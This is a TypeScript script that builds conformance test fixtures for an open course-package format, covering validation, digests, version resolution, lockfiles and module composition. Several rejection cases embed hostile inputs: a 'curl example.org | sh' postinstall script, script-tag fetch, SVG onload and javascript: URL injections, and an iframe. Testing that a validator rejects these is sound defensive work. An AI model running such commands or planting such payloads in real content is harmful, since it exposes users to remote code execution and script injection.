// Builds the conformance fixtures in conformance/cases/ (CC-BY-4.0) and their expected results.
// Each case states what it expects for invalid input (the problem kind) by hand. For valid input,
// the expected digest, lockfile bytes or outline is computed once by the reference implementation
// and then frozen in the committed fixture, so a later change to the implementation shows up as a
// conformance failure instead of moving the expectation. Re-run only to add or change cases:
//
//   node --experimental-strip-types conformance/tools/build-fixtures.ts
//
// SPDX-License-Identifier: Apache-2.0
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  buildBundle,
  canonicalJson,
  formatJson,
  keyIdFor,
  type OcsActivity,
  type OcsCodexNote,
  type OcsManifest,
  type OcsResource,
  type OcsUnit,
  packageDigest,
  activityExportDigest,
  serializeBundle,
  signActivityExportPublication,
  SigningIdentity,
  signPackagePublication,
  type SignedEnvelope,
} from "../../packages/ocs/src/index.ts";
import { runConformanceCase } from "../../packages/ocs/src/node/conformance.ts";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const CASES = join(ROOT, "cases");
const KEYS = join(ROOT, "keys");

type Files = Record<string, string>;

// ---------------------------------------------------------------------------------------------
// Package builders

interface Spec {
  manifest: Partial<OcsManifest> & Pick<OcsManifest, "id" | "version" | "outline">;
  units?: OcsUnit[];
  activities?: OcsActivity[];
  resources?: OcsResource[];
  codex?: OcsCodexNote[];
}

function pkg(spec: Spec): Files {
  const manifest = { specVersion: "1.0", title: `Course ${spec.manifest.id}`, language: "en", standards: [], modules: [], overrides: [], ...spec.manifest };
  const files: Files = { "ocs.json": formatJson(manifest) };
  for (const u of spec.units ?? []) files[`units/${u.id}.json`] = formatJson(u);
  for (const a of spec.activities ?? []) files[`activities/${a.id}.json`] = formatJson(a);
  for (const r of spec.resources ?? []) files[`resources/${r.id}.json`] = formatJson(r);
  for (const n of spec.codex ?? []) files[`codex/${n.id}.json`] = formatJson(n);
  return files;
}

const unit = (id: string, items: OcsUnit["items"], title = `Unit ${id}`, extra: Partial<OcsUnit> = {}): OcsUnit => ({ id, title, standards: [], items, ...extra });
const release = (id: string, use: OcsResource["use"]): OcsResource => ({ kind: "release", id, title: `Resource ${id}`, release: { resourceId: `rsc_${id}`, version: "1.0.0" }, use });
const note = (id: string, visibility: OcsCodexNote["visibility"] = "students", purpose: OcsCodexNote["purpose"] = "context"): OcsCodexNote =>
  ({ id, title: `Note ${id}`, body: `About ${id}.`, purpose, visibility }) as OcsCodexNote;
const districtActivity = (id: string, role: OcsActivity["role"] = "assignment"): OcsActivity => ({ id, title: `Activity ${id}`, role, definition: { definitionId: `adf_${id}`, version: 1 } });

const ALIGN = { frameworkKey: "example-framework", competencyUri: "https://standards.example.org/competency/42" };

/** A small valid course: a unit with a note, an activity and a resource. */
const minimal = (id = "example.org/minimal", version = "1.0.0"): Files =>
  pkg({
    manifest: { id, version, outline: [{ kind: "unit", unit: "start" }] },
    units: [unit("start", [{ kind: "codex", ref: "welcome" }, { kind: "activity", ref: "task" }, { kind: "resource", ref: "reading" }])],
    activities: [districtActivity("task")],
    resources: [release("reading", "embed")],
    codex: [note("welcome")],
  });

/** A one-unit module package. */
const leaf = (id: string, version: string, unitIds: string[] = ["rules"], extra: Partial<Spec> = {}): Files =>
  pkg({
    manifest: { id, version, outline: unitIds.map((u) => ({ kind: "unit" as const, unit: u })), ...(extra.manifest ?? {}) },
    units: unitIds.map((u) => unit(u, [{ kind: "resource", ref: `${u}-sheet` }], `${id.split("/")[1]} ${u}`)),
    resources: unitIds.map((u) => release(`${u}-sheet`, "licensed-copy")),
  });

/** A course that includes the given modules, in outline order, after its own unit. */
const courseWith = (modules: OcsManifest["modules"], extra: Partial<OcsManifest> = {}, id = "example.org/course"): Files =>
  pkg({
    manifest: { id, version: "1.0.0", modules, outline: [{ kind: "unit", unit: "intro" }, ...modules.map((m) => ({ kind: "module" as const, module: m.name }))], ...extra },
    units: [unit("intro", [{ kind: "codex", ref: "welcome" }])],
    codex: [note("welcome")],
  });

const mod = (name: string, pkgId: string, range: string, extra: Partial<OcsManifest["modules"][number]> = {}) => ({ name, package: pkgId, range, ...extra });

// ---------------------------------------------------------------------------------------------
// Activity exports

const exportDoc = (overrides: Record<string, unknown> = {}, activity: Record<string, unknown> = {}) => ({
  specVersion: "1.1",
  id: "example.org/poem-image",
  version: "1.0.0",
  language: "en",
  activity: {
    template: "read-and-respond",
    title: "An image in a poem",
    subject: "english-language-arts",
    gradeBand: "3-5",
    overview: "Listen to a short poem and talk about one image in it.",
    aiHelp: "hints-only",
    due: { kind: "after-install", days: 7 },
    passage: "The fog comes on little cat feet.",
    questions: [{ prompt: "What animal does the fog move like?" }],
    resources: ["fog"],
    ...activity,
  },
  rubric: { title: "Talking about an image", criteria: [{ id: "image", title: "Names the image", levels: [{ id: "not-yet", label: "Not yet", points: 0 }, { id: "yes", label: "Yes", points: 2 }] }] },
  alignments: [ALIGN],
  readings: [{ id: "fog", title: "Fog (excerpt)", body: "The fog comes on little cat feet.", attribution: "Carl Sandburg, Fog (1916). Public domain." }],
  ...overrides,
});

// ---------------------------------------------------------------------------------------------
// Writing cases

interface Case {
  id: string;
  kind: "package" | "export" | "resolve" | "compose" | "bundle" | "publication";
  description: string;
  spec: string[];
  /** Files of the case, by path relative to the case directory. */
  files: Files;
  input: Record<string, string>;
  /** Hand-stated expectation for refusals; valid results are computed and frozen. */
  expect?: Record<string, unknown>;
}

const cases: Case[] = [];
const prefix = (dir: string, files: Files): Files => Object.fromEntries(Object.entries(files).map(([path, text]) => [`${dir}/${path}`, text]));
const store = (packages: Files[], extra: Files = {}): Files => {
  const out: Files = { ...extra };
  for (const files of packages) {
    const m = JSON.parse(files["ocs.json"]!) as { id: string; version: string };
    Object.assign(out, prefix(`store/${m.id}/${m.version}`, files));
  }
  return out;
};

function packageCase(id: string, description: string, spec: string[], files: Files, expect?: Record<string, unknown>) {
  cases.push({ id: `package/${id}`, kind: "package", description, spec, files: prefix("package", files), input: { package: "package" }, ...(expect === undefined ? {} : { expect }) });
}
const invalidPackage = (id: string, description: string, spec: string[], files: Files) => packageCase(id, description, spec, files, { valid: false, problem: "invalid-package" });

function exportCase(id: string, description: string, spec: string[], value: unknown, expect?: Record<string, unknown>, raw?: string) {
  cases.push({ id: `export/${id}`, kind: "export", description, spec, files: { "export.json": raw ?? formatJson(value) }, input: { export: "export.json" }, ...(expect === undefined ? {} : { expect }) });
}
const invalidExport = (id: string, description: string, spec: string[], value: unknown) => exportCase(id, description, spec, value, { valid: false, problem: "invalid-export" });

function resolveCase(kind: "resolve" | "compose", id: string, description: string, spec: string[], course: Files, packages: Files[], options: { lock?: string; published?: Record<string, string>; expect?: Record<string, unknown> } = {}) {
  const files: Files = { ...prefix("course", course), ...store(packages, options.published === undefined ? {} : { "store/published-digests.json": formatJson(options.published) }) };
  if (options.lock !== undefined) files["previous.lock"] = options.lock;
  cases.push({
    id: `${kind}/${id}`,
    kind,
    description,
    spec,
    files,
    input: { course: "course", store: "store", ...(options.lock === undefined ? {} : { lock: "previous.lock" }) },
    ...(options.expect === undefined ? {} : { expect: options.expect }),
  });
}

// ---------------------------------------------------------------------------------------------
// package/: reading, layout, strictness, plain text and the digest (§3 to §9)

packageCase("valid-minimal", "A one-unit course with a note, a district-local activity and a resource.", ["§5", "§6", "§7", "§9"], minimal());
{
  const reformatted = Object.fromEntries(Object.entries(minimal()).toReversed().map(([path, text]) => {
    const value = JSON.parse(text) as Record<string, unknown>;
    return [path, JSON.stringify(Object.fromEntries(Object.entries(value).toReversed()))];
  }));
  packageCase("digest-ignores-formatting", "The same files as valid-minimal, minified with members reversed: the digest must equal valid-minimal's.", ["§3.4", "§9"], reformatted);
  packageCase("digest-ignores-lockfile", "valid-minimal with an ocs.lock: the lockfile is not part of the digest, so the digest must equal valid-minimal's.", ["§9", "§11"], {
    ...minimal(),
    "ocs.lock": formatJson({ lockVersion: 1, specVersion: "1.0", root: { id: "example.org/minimal", version: "1.0.0", digest: `sha256:${"0".repeat(64)}`, modules: [] }, packages: [] }),
  });
  const changed = minimal();
  changed["codex/welcome.json"] = formatJson({ ...note("welcome"), body: "About welcome!" });
  packageCase("digest-follows-content", "valid-minimal with one note's body changed: the digest must differ from valid-minimal's.", ["§9"], changed);
}
packageCase("valid-every-entry", "Every entry form: activity roles, a gadget-blueprint resource, all Codex note kinds, unit standards and summaries, subject and grade band, and a module with a rights cap and a digest pin.", ["§6", "§7"], pkg({
  manifest: {
    id: "example.org/every-entry",
    version: "2.3.4",
    summary: "Every entry form.",
    subject: "science",
    gradeBand: "9-12",
    standards: [ALIGN],
    modules: [mod("safety", "example.net/lab-safety", "1.0.0", { digest: `sha256:${"a".repeat(64)}`, rights: "embed" })],
    outline: [{ kind: "unit", unit: "cells" }, { kind: "module", module: "safety" }],
    overrides: [{ kind: "hide", target: { modules: ["safety"], unit: "rules", item: "goggles" } }],
  },
  units: [unit("cells", [{ kind: "activity", ref: "look" }, { kind: "activity", ref: "lab" }, { kind: "activity", ref: "check" }, { kind: "resource", ref: "sim" }, { kind: "resource", ref: "diagram" }, { kind: "codex", ref: "overview" }, { kind: "codex", ref: "guide" }, { kind: "codex", ref: "key" }], "Cells", { summary: "Cells and membranes.", standards: [ALIGN] })],
  activities: [districtActivity("look", "lesson"), districtActivity("lab", "assignment"), districtActivity("check", "assessment")],
  resources: [{ kind: "gadget-blueprint", id: "sim", title: "Membrane simulator", release: { resourceId: "rsc_sim", version: "1.0.0" }, releaseCommit: "0123456789abcdef0123456789abcdef01234567", use: "link" }, release("diagram", "excerpt")],
  codex: [note("overview"), note("guide", "teacher-only"), note("key", "teacher-only", "answer-key")],
}));
packageCase("valid-portable-1.1", "A 1.1 package whose activity is a portable reference.", ["§8", "§14.1"], pkg({
  manifest: { specVersion: "1.1", id: "example.org/portable", version: "1.0.0", outline: [{ kind: "unit", unit: "poems" }] },
  units: [unit("poems", [{ kind: "activity", ref: "image" }])],
  activities: [{ id: "image", title: "An image in a poem", role: "assignment", definition: { portable: { id: "example.org/poem-image", version: "1.0.0", digest: `sha256:${"b".repeat(64)}` } } }],
}));
packageCase("valid-plain-text-comparisons", "Ordinary text with < and > is plain text.", ["§3.2"], pkg({
  manifest: { id: "example.org/comparisons", version: "1.0.0", title: "When x < 3 and y > 2", outline: [{ kind: "unit", unit: "inequalities" }] },
  units: [unit("inequalities", [], "Is 2 < 3? Yes, and 3 > 2.")],
}));

invalidPackage("missing-manifest", "A package with no ocs.json.", ["§5"], { "units/start.json": minimal()["units/start.json"]! });
invalidPackage("stray-script", "A script beside the data files.", ["§5", "§18"], { ...minimal(), "scripts/setup.js": "{}" });
invalidPackage("stray-package-json", "A package.json beside the data files.", ["§5", "§18"], { ...minimal(), "package.json": "{}" });
invalidPackage("nested-entry-path", "An entry in a nested directory.", ["§5"], { ...minimal(), "units/extra/more.json": formatJson(unit("more", [])) });
invalidPackage("entry-not-json", "An entry that is not JSON.", ["§3.1", "§5"], { ...minimal(), "codex/welcome.json": "title: Welcome\n" });
invalidPackage("file-too-large", "A file over 262,144 bytes.", ["§5"], { ...minimal(), "codex/big.json": formatJson({ ...note("big"), body: "x".repeat(19_000) }) + " ".repeat(262_145) });
invalidPackage("unknown-manifest-member", "An install script in the manifest.", ["§3.1"], { ...minimal(), "ocs.json": formatJson({ ...JSON.parse(minimal()["ocs.json"]!), scripts: { postinstall: "curl example.org | sh" } }) });
invalidPackage("unknown-unit-member", "An unknown member in a unit.", ["§3.1"], { ...minimal(), "units/start.json": formatJson({ ...JSON.parse(minimal()["units/start.json"]!), onOpen: "alert(1)" }) });
invalidPackage("active-content-script", "A unit title holding a script tag.", ["§3.2"], { ...minimal(), "units/start.json": formatJson({ ...JSON.parse(minimal()["units/start.json"]!), title: "Start<script>fetch('https://example.org')</script>" }) });
invalidPackage("active-content-javascript-url", "A note body holding a javascript: URL.", ["§3.2"], { ...minimal(), "codex/welcome.json": formatJson({ ...note("welcome"), body: "Click JavaScript:alert(1)" }) });
invalidPackage("active-content-svg", "A resource title holding an SVG tag.", ["§3.2"], { ...minimal(), "resources/reading.json": formatJson({ ...release("reading", "embed"), title: "<svg onload=alert(1)>" }) });
invalidPackage("blank-title", "A title that is only white space.", ["§3.2"], { ...minimal(), "units/start.json": formatJson({ ...JSON.parse(minimal()["units/start.json"]!), title: "   " }) });
invalidPackage("id-file-name-mismatch", "An entry whose id differs from its file name.", ["§5"], { ...minimal(), "resources/other.json": formatJson(release("reading", "link")) });
invalidPackage("dangling-unit-item", "A unit item naming an activity that does not exist.", ["§7.1"], { ...minimal(), "units/start.json": formatJson(unit("start", [{ kind: "activity", ref: "missing" }])) });
invalidPackage("duplicate-unit-item", "The same item twice in one unit.", ["§7.1"], { ...minimal(), "units/start.json": formatJson(unit("start", [{ kind: "codex", ref: "welcome" }, { kind: "codex", ref: "welcome" }])) });
invalidPackage("answer-key-for-students", "An answer key visible to students.", ["§7.4"], { ...minimal(), "codex/welcome.json": formatJson({ ...note("welcome"), purpose: "answer-key" }) });
invalidPackage("empty-outline", "A course with an empty outline.", ["§6.3"], pkg({ manifest: { id: "example.org/empty", version: "1.0.0", outline: [] } }));
invalidPackage("outline-unknown-unit", "An outline naming a unit the package does not have.", ["§6.3"], pkg({ manifest: { id: "example.org/x", version: "1.0.0", outline: [{ kind: "unit", unit: "ghost" }] } }));
invalidPackage("module-not-in-outline", "A declared module that is not placed in the outline.", ["§6.3"], pkg({
  manifest: { id: "example.org/x", version: "1.0.0", modules: [mod("safety", "example.net/lab-safety", "^1.0.0")], outline: [{ kind: "unit", unit: "a" }] },
  units: [unit("a", [])],
}));
invalidPackage("module-package-twice", "The same package included twice.", ["§6.2"], pkg({
  manifest: { id: "example.org/x", version: "1.0.0", modules: [mod("one", "example.net/lab-safety", "^1.0.0"), mod("two", "example.net/lab-safety", "^1.0.0")], outline: [{ kind: "module", module: "one" }, { kind: "module", module: "two" }] },
}));
invalidPackage("unit-and-module-same-name", "A unit and a module with the same name.", ["§6.3"], pkg({
  manifest: { id: "example.org/x", version: "1.0.0", modules: [mod("safety", "example.net/lab-safety", "^1.0.0")], outline: [{ kind: "unit", unit: "safety" }, { kind: "module", module: "safety" }] },
  units: [unit("safety", [])],
}));
invalidPackage("digest-pin-on-range", "A module digest pin on a range that is not exact.", ["§6.2"], pkg({
  manifest: { id: "example.org/x", version: "1.0.0", modules: [mod("safety", "example.net/lab-safety", "^1.0.0", { digest: `sha256:${"a".repeat(64)}` })], outline: [{ kind: "module", module: "safety" }] },
}));
invalidPackage("override-unknown-module", "An override whose first module is not declared.", ["§6.3", "§12.3"], pkg({
  manifest: { id: "example.org/x", version: "1.0.0", outline: [{ kind: "unit", unit: "a" }], overrides: [{ kind: "hide", target: { modules: ["ghost"], unit: "a" } }] },
  units: [unit("a", [])],
}));
invalidPackage("portable-in-1.0", "A portable activity in a package that declares 1.0.", ["§8"], pkg({
  manifest: { specVersion: "1.0", id: "example.org/portable", version: "1.0.0", outline: [{ kind: "unit", unit: "poems" }] },
  units: [unit("poems", [{ kind: "activity", ref: "image" }])],
  activities: [{ id: "image", title: "An image in a poem", role: "assignment", definition: { portable: { id: "example.org/poem-image", version: "1.0.0", digest: `sha256:${"b".repeat(64)}` } } }],
}));
invalidPackage("unknown-spec-version", "A specVersion this version does not define.", ["§8"], { ...minimal(), "ocs.json": formatJson({ ...JSON.parse(minimal()["ocs.json"]!), specVersion: "1.2" }) });
invalidPackage("bad-package-id", "A package ID without a publisher domain.", ["§4.1"], minimal("biology-9"));
invalidPackage("bad-version", "A two-part version.", ["§4.3"], minimal("example.org/minimal", "1.0"));
invalidPackage("prerelease-version", "A pre-release version, which 1.1 does not allow.", ["§4.3"], minimal("example.org/minimal", "1.0.0-beta.1"));
invalidPackage("bad-range", "A module range with a wildcard.", ["§4.4"], pkg({ manifest: { id: "example.org/x", version: "1.0.0", modules: [mod("safety", "example.net/lab-safety", "1.x")], outline: [{ kind: "module", module: "safety" }] } }));
invalidPackage("or-range", "A module range with ||.", ["§4.4"], pkg({ manifest: { id: "example.org/x", version: "1.0.0", modules: [mod("safety", "example.net/lab-safety", "^1.0.0 || ^2.0.0")], outline: [{ kind: "module", module: "safety" }] } }));

// ---------------------------------------------------------------------------------------------
// export/: activity definition exports (§14)

exportCase("valid-read-and-respond", "A read-and-respond export with a reading, a rubric and an alignment.", ["§14.2", "§14.4", "§14.5"], exportDoc());
exportCase("valid-defaults-omitted", "An export that leaves every defaulted member out. The digest covers the file as written.", ["§14.2", "§14.3"], (() => {
  const { readings: _r, ...doc } = exportDoc({}, { resources: undefined });
  const activity = { ...(doc.activity as Record<string, unknown>) };
  delete activity.resources;
  return { ...doc, activity, rubric: undefined };
})());
exportCase("valid-every-template", "A writing task with every optional member.", ["§14.4"], exportDoc({}, { template: "writing-task", passage: undefined, questions: undefined, prompt: "Write about the fog.", genre: "narrative", minWords: 50, minimumCitations: 1, additionalArtifactTypes: ["image"], collaboration: "group" }));
exportCase("valid-primary-source", "A primary-source analysis naming its readings as sources.", ["§14.4"], exportDoc({}, { template: "primary-source-analysis", passage: undefined, questions: undefined, sources: ["fog"], sourcingQuestions: ["Who wrote it?"], contextualizationQuestions: ["When?"], claimPrompt: "What does the image suggest?", minimumEvidence: 1 }));
exportCase("digest-ignores-formatting", "valid-read-and-respond, minified: the digest must equal valid-read-and-respond's.", ["§14.3"], undefined, undefined, JSON.stringify(exportDoc()));
invalidExport("answer-in-problem-set", "A problem with an answer: answers belong in teacher-only notes.", ["§14.2", "§14.4"], exportDoc({}, { template: "problem-set", passage: undefined, questions: undefined, problems: [{ prompt: "2 + 3 = ?", answer: "5" }], showWork: true }));
invalidExport("fixed-due-date", "A fixed due date.", ["§14.4"], exportDoc({}, { due: { kind: "fixed", dueAt: "2026-11-01T00:00:00Z" } }));
invalidExport("unknown-reading", "An activity naming a reading the export does not have.", ["§14.2"], exportDoc({ readings: [] }));
invalidExport("active-content", "A question holding an iframe.", ["§3.2", "§14.2"], exportDoc({}, { questions: [{ prompt: "<iframe src=https://example.org>" }] }));
invalidExport("rubric-levels-descending", "Rubric levels not listed lowest first.", ["§14.5"], exportDoc({ rubric: { title: "R", criteria: [{ id: "c", title: "C", levels: [{ id: "a", label: "A", points: 2 }, { id: "b", label: "B", points: 1 }] }] } }));
invalidExport("spec-version-1.0", "An export that declares 1.0.", ["§14.2"], exportDoc({ specVersion: "1.0" }));
invalidExport("district-local-scope", "An export carrying a district scope.", ["§14.2"], exportDoc({ scope: { districtId: "dst_example" } }));
invalidExport("duplicate-alignment", "The same alignment twice.", ["§14.2"], exportDoc({ alignments: [ALIGN, ALIGN] }));

// ---------------------------------------------------------------------------------------------
// resolve/: resolution and lockfiles (§10, §11)

const SAFETY = "example.net/lab-safety";
const CELLS = "example.com/cells-core";
const HIST = "example.edu/sources";
{
  const safety = ["1.0.0", "1.1.0", "1.2.3", "2.0.0"].map((v) => leaf(SAFETY, v));
  resolveCase("resolve", "highest-compatible", "^1.0.0 selects the highest 1.x version, 1.2.3.", ["§10.2", "§11"], courseWith([mod("safety", SAFETY, "^1.0.0")]), safety);
  resolveCase("resolve", "tilde-range", "~1.1.0 selects 1.1.0, not 1.2.3.", ["§4.4", "§10.2"], courseWith([mod("safety", SAFETY, "~1.1.0")]), safety);
  resolveCase("resolve", "comparison-range", ">=1.1.0 <2.0.0 selects 1.2.3.", ["§4.4"], courseWith([mod("safety", SAFETY, ">=1.1.0 <2.0.0")]), safety);
  resolveCase("resolve", "exact-version", "An exact version selects that version.", ["§4.4"], courseWith([mod("safety", SAFETY, "1.0.0")]), safety);
  resolveCase("resolve", "zero-major-caret", "^0.2.0 does not accept 0.3.0.", ["§4.4"], courseWith([mod("safety", SAFETY, "^0.2.0")]), ["0.2.0", "0.2.5", "0.3.0"].map((v) => leaf(SAFETY, v)));
}
async function lockOf(course: Files, packages: Files[], lock?: string): Promise<string> {
  const dir = join(CASES, ".tmp");
  rmSync(dir, { recursive: true, force: true });
  writeFiles(dir, { ...prefix("course", course), ...store(packages) });
  if (lock !== undefined) writeFiles(dir, { "previous.lock": lock });
  const result = await runConformanceCase({ kind: "resolve", caseDir: dir, input: { course: "course", store: "store", ...(lock === undefined ? {} : { lock: "previous.lock" }) } });
  rmSync(dir, { recursive: true, force: true });
  if (typeof result.lock !== "string") throw new Error(`no lock: ${JSON.stringify(result)}`);
  return result.lock;
}
{
  const course = courseWith([mod("safety", SAFETY, "^1.0.0")]);
  const old = await lockOf(course, [leaf(SAFETY, "1.0.0")]);
  resolveCase("resolve", "locked-version-kept", "With a lockfile at 1.0.0, a published 1.2.3 is not picked up: a locked version is kept while it fits.", ["§10.3"], course, ["1.0.0", "1.2.3"].map((v) => leaf(SAFETY, v)), { lock: old });
  const narrowed = courseWith([mod("safety", SAFETY, "^1.1.0")]);
  resolveCase("resolve", "locked-version-no-longer-fits", "The course now needs ^1.1.0, so the locked 1.0.0 is replaced by the highest fitting version.", ["§10.2", "§10.3"], narrowed, ["1.0.0", "1.1.0", "1.2.3"].map((v) => leaf(SAFETY, v)), { lock: old });
  const tampered = leaf(SAFETY, "1.0.0");
  tampered["units/rules.json"] = formatJson({ ...JSON.parse(tampered["units/rules.json"]!), title: "Changed after locking" });
  resolveCase("resolve", "locked-digest-mismatch", "The locked version's content changed after it was locked.", ["§10.1"], course, [tampered], { lock: old, expect: { problem: "digest-mismatch" } });
}
{
  // A diamond: the course needs cells ^2 and safety ^1.0; cells needs safety ~1.1. One safety version.
  const cells = pkg({
    manifest: { id: CELLS, version: "2.1.0", modules: [mod("safety", SAFETY, "~1.1.0")], outline: [{ kind: "unit", unit: "membranes" }, { kind: "module", module: "safety" }] },
    units: [unit("membranes", [{ kind: "resource", ref: "diagram" }], "Membranes")],
    resources: [release("diagram", "embed")],
  });
  const safety = ["1.0.0", "1.1.0", "1.1.4", "1.2.0"].map((v) => leaf(SAFETY, v));
  resolveCase("resolve", "diamond-one-version", "The course and a module both include lab-safety; the whole course gets one version that satisfies both (1.1.4).", ["§10.2"], courseWith([mod("cells", CELLS, "^2.0.0"), mod("safety", SAFETY, "^1.0.0")]), [cells, ...safety]);
  resolveCase("resolve", "version-conflict", "The course needs lab-safety ^1.2.0 but cells needs ~1.1.0: no version fits both.", ["§10.2"], courseWith([mod("cells", CELLS, "^2.0.0"), mod("safety", SAFETY, "^1.2.0")]), [cells, ...safety], { expect: { problem: "version-conflict" } });
}
resolveCase("resolve", "unknown-package", "A module that no source has published.", ["§10.2"], courseWith([mod("safety", SAFETY, "^1.0.0")]), [], { expect: { problem: "unknown-package" } });
resolveCase("resolve", "no-fitting-version", "Only 2.0.0 is published, the course needs ^1.0.0.", ["§10.2"], courseWith([mod("safety", SAFETY, "^1.0.0")]), [leaf(SAFETY, "2.0.0")], { expect: { problem: "version-conflict" } });
{
  const a = pkg({ manifest: { id: "example.com/a", version: "1.0.0", modules: [mod("b", "example.com/b", "^1.0.0")], outline: [{ kind: "module", module: "b" }] } });
  const b = pkg({ manifest: { id: "example.com/b", version: "1.0.0", modules: [mod("a", "example.com/a", "^1.0.0")], outline: [{ kind: "module", module: "a" }] } });
  resolveCase("resolve", "cycle", "Two modules include each other.", ["§10.5"], courseWith([mod("a", "example.com/a", "^1.0.0")]), [a, b], { expect: { problem: "cycle" } });
  const back = pkg({ manifest: { id: "example.com/a", version: "1.0.0", modules: [mod("course", "example.org/course", "^1.0.0")], outline: [{ kind: "module", module: "course" }] } });
  resolveCase("resolve", "includes-the-course", "A module that includes the course.", ["§10.5"], courseWith([mod("a", "example.com/a", "^1.0.0")]), [back], { expect: { problem: "cycle" } });
}
{
  const safety = leaf(SAFETY, "1.0.0");
  const digest = await packageDigest(safety);
  resolveCase("resolve", "digest-pin-matches", "An exact module pinned by the right digest.", ["§6.2", "§10.1"], courseWith([mod("safety", SAFETY, "1.0.0", { digest })]), [safety]);
  resolveCase("resolve", "digest-pin-mismatch", "An exact module pinned by another digest.", ["§10.1"], courseWith([mod("safety", SAFETY, "1.0.0", { digest: `sha256:${"c".repeat(64)}` })]), [safety], { expect: { problem: "digest-mismatch" } });
  resolveCase("resolve", "published-digest-mismatch", "A tampered mirror: the source's recorded digest is not the digest of what it serves.", ["§10.1", "§18"], courseWith([mod("safety", SAFETY, "^1.0.0")]), [safety], { published: { [`${SAFETY}@1.0.0`]: `sha256:${"d".repeat(64)}` }, expect: { problem: "digest-mismatch" } });
  const impostor = leaf("example.net/impostor", "1.0.0");
  const files: Files = { ...prefix("course", courseWith([mod("safety", SAFETY, "^1.0.0")])), ...prefix(`store/${SAFETY}/1.0.0`, impostor) };
  cases.push({ id: "resolve/identity-mismatch", kind: "resolve", description: "The source serves another package under lab-safety 1.0.0.", spec: ["§10.1"], files, input: { course: "course", store: "store" }, expect: { problem: "identity-mismatch" } });
  const invalid = { ...safety, "scripts/run.js": "{}" };
  resolveCase("resolve", "invalid-module", "A module whose files are not a valid package.", ["§10.1"], courseWith([mod("safety", SAFETY, "^1.0.0")]), [invalid], { expect: { problem: "invalid-package" } });
}
{
  const portable = pkg({
    manifest: { specVersion: "1.1", id: HIST, version: "1.0.0", outline: [{ kind: "unit", unit: "letters" }] },
    units: [unit("letters", [{ kind: "activity", ref: "analyze" }])],
    activities: [{ id: "analyze", title: "Analyze a letter", role: "assignment", definition: { portable: { id: "example.edu/letter-analysis", version: "1.0.0", digest: `sha256:${"e".repeat(64)}` } } }],
  });
  resolveCase("resolve", "spec-1.1-propagates", "A 1.0 course that includes a 1.1 module gets a 1.1 lockfile.", ["§11"], courseWith([mod("sources", HIST, "^1.0.0")]), [portable]);
  resolveCase("resolve", "spec-1.0-stays", "A course of 1.0 packages gets a 1.0 lockfile.", ["§11"], courseWith([mod("safety", SAFETY, "^1.0.0")]), [leaf(SAFETY, "1.0.0")]);
}
{
  // Determinism across inputs: the store's files are minified and reordered, and versions are
  // published in another order; the lockfile must be byte-identical to resolve/highest-compatible.
  const safety = ["2.0.0", "1.2.3", "1.0.0", "1.1.0"].map((v) => {
    const files = leaf(SAFETY, v);
    return Object.fromEntries(Object.entries(files).toReversed().map(([path, text]) => [path, JSON.stringify(Object.fromEntries(Object.entries(JSON.parse(text) as object).toReversed()))]));
  });
  resolveCase("resolve", "determinism-reformatted-store", "resolve/highest-compatible with every store file minified and reordered: the lockfile must be byte-identical.", ["§3.3", "§10.2", "§11"], courseWith([mod("safety", SAFETY, "^1.0.0")]), safety);
}

// ---------------------------------------------------------------------------------------------
// compose/: composition, overrides, provenance and rights (§12, §13)

{
  const safety = leaf(SAFETY, "1.2.0", ["rules", "spills", "fire"]);
  resolveCase("compose", "module-in-place", "A module's units appear where the module is placed, after the course's own unit, with provenance.", ["§12.1", "§12.2"], courseWith([mod("safety", SAFETY, "^1.0.0")]), [safety]);
  resolveCase("compose", "overrides", "Hide a unit and an item, rename a unit and an item, reorder a module's units.", ["§12.3"], courseWith([mod("safety", SAFETY, "^1.0.0")], {
    overrides: [
      { kind: "hide", target: { modules: ["safety"], unit: "fire" } },
      { kind: "rename", target: { modules: ["safety"], unit: "spills" }, title: "Cleaning up spills" },
      { kind: "reorder", target: { modules: ["safety"] }, order: ["spills"] },
      { kind: "hide", target: { modules: ["safety"], unit: "rules", item: "rules-sheet" } },
    ],
  }), [safety]);
  resolveCase("compose", "override-matches-nothing", "An override naming a unit the module no longer has.", ["§12.3"], courseWith([mod("safety", SAFETY, "^1.0.0")], { overrides: [{ kind: "hide", target: { modules: ["safety"], unit: "goggles" } }] }), [safety], { expect: { problem: "invalid-change" } });
  resolveCase("compose", "reorder-unknown-item", "A reorder listing an item the unit does not have.", ["§12.3"], courseWith([mod("safety", SAFETY, "^1.0.0")], { overrides: [{ kind: "reorder", target: { modules: ["safety"], unit: "rules" }, order: ["ghost"] }] }), [safety], { expect: { problem: "invalid-change" } });
}
{
  // Nested modules: the course includes cells, which includes safety and renames its unit; the
  // course renames it again and has the last word. Rights narrow on the way up.
  const safety = pkg({
    manifest: { id: SAFETY, version: "1.0.0", outline: [{ kind: "unit", unit: "rules" }] },
    units: [unit("rules", [{ kind: "resource", ref: "poster" }, { kind: "resource", ref: "video" }])],
    resources: [release("poster", "licensed-copy"), release("video", "link")],
  });
  const cells = pkg({
    manifest: {
      id: CELLS,
      version: "2.0.0",
      modules: [mod("safety", SAFETY, "^1.0.0", { rights: "excerpt" })],
      outline: [{ kind: "module", module: "safety" }, { kind: "unit", unit: "membranes" }],
      overrides: [{ kind: "rename", target: { modules: ["safety"], unit: "rules" }, title: "Cells lab rules" }],
      standards: [ALIGN],
    },
    units: [unit("membranes", [{ kind: "resource", ref: "diagram" }], "Membranes", { standards: [ALIGN, { frameworkKey: "example-framework", competencyUri: "https://standards.example.org/competency/43" }] })],
    resources: [release("diagram", "licensed-copy")],
  });
  resolveCase("compose", "nested-overrides-and-rights", "A module's overrides apply first and the course's last; rights caps narrow the use along the path; standards are collected once each.", ["§12.1", "§12.3", "§12.4", "§13"], courseWith([mod("cells", CELLS, "^2.0.0", { rights: "embed" })], {
    standards: [ALIGN],
    overrides: [{ kind: "rename", target: { modules: ["cells", "safety"], unit: "rules" }, title: "Biology lab rules" }, { kind: "reorder", target: { modules: ["cells"] }, order: ["membranes"] }],
  }), [cells, safety]);
  const history = pkg({
    manifest: { id: HIST, version: "1.0.0", modules: [mod("safety", SAFETY, "^1.0.0")], outline: [{ kind: "module", module: "safety" }, { kind: "unit", unit: "letters" }] },
    units: [unit("letters", [{ kind: "codex", ref: "context" }], "Letters")],
    codex: [note("context")],
  });
